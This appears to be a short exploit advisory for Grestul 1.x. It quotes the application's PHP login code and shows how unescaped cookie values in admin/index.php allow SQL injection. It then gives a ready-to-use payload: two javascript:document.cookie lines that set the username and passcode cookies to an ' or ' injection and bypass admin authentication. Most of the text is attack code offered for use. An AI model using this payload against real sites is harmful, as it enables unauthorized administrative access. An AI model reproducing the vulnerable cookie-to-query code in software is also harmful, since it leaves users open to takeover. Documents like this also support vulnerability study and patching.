Grestul 1.x Auth Bypass by Cookie SQL Injection Vulnerability
=============================================================


########################################
Grestul Sql Injection By Cookie ( bypass)
########################################
Autore: x0r
########################################

Let&#039;s Go!

\admin\login.php :

$username = SafeAddSlashes($_POST[&#039;username&#039;]);
$passcode = SafeAddSlashes(md5($_POST[&#039;passcode&#039;]));
$time = time();
$check = SafeAddSlashes($_POST[&#039;setcookie&#039;]);

$query = "SELECT user, pass FROM grestullogin WHERE user = &#039;$username&#039; AND
pass = &#039;$passcode&#039;";
$result = mysql_query($query, $db);
if(mysql_num_rows($result)) {
$_SESSION[&#039;loggedin&#039;] = 1;
	if($check) {
	setcookie("grestul[username]", $username, $time + 3600);
	setcookie("grestul[passcode]", $passcode, $time + 3600);

Oh damn ! SafeAddSlashes...our &#039; or &#039; don&#039;t go! But...\admin\index.php

if(isset($_COOKIE[&#039;grestul&#039;])) {

include &#039;inc/config.php&#039;;

$username = $_COOKIE[&#039;grestul&#039;][&#039;username&#039;];
$passcode = $_COOKIE[&#039;grestul&#039;][&#039;passcode&#039;];

$query = "SELECT user, pass FROM grestullogin WHERE user = &#039;$username&#039; AND
pass = &#039;$passcode&#039;";
$result = mysql_query($query, $db);

So....

Exploit:

[+]javascript:document.cookie = "grestul[username]=&#039; or &#039;; path=/";
[+]javascript:document.cookie = "grestul[passcode]=&#039; or &#039;; path=/";

And then \admin\index.php ^ ^ Auth Bypassed ^ ^

################################################



